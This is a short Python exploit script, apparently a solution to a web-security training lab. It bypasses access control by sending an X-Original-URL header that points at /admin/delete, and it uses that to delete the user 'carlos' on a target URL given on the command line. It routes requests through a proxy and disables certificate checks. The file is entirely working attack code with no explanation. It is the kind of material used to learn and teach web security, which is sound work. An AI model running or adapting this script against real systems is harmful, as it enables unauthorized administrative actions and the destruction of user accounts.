import os
import requests
import urllib3
import sys

from dotenv import load_dotenv

load_dotenv()

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def delete_user(s, url):
    admin_path = "/admin/delete"
    delete_path = "/?username=carlos"
    headers = {"X-Original-URL": admin_path}
    s.get(url + delete_path, headers=headers, verify=False, proxies=proxies)

    r = s.get(url, verify=False, proxies=proxies)
    if "Congratulations" in r.text:
        print("(-> User sucessfully deleted!!!")
    else:
        print("(-) Couldn't delete user")


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    s = requests.Session()
    delete_user(s, url)


if __name__ == "__main__":
    main()
